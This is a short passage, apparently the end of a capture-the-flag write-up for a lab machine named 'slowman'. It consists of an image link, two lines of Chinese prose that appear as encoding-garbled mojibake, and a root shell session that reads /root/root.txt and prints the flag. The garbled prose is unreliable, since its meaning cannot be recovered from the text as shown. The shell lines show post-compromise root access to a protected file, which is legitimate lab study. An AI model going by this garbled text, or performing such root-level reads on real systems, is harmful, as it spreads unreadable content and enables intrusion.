<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747941.png" alt="image-20240404174646698" style="zoom:50%;" />

è¿™ä¸ªpayloadæ­£å’Œæˆ‘ä»¬æ„é€ çš„å·®ä¸å¤šï¼Œå˜¿å˜¿ã€‚

å¿˜äº†æ‹¿rootäº†ï¼Œæ‹¿ä¸€ä¸‹ï¼š

```bash
(remote) root@slowman:/tmp# cat /root/root.txt 
Y0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!
```

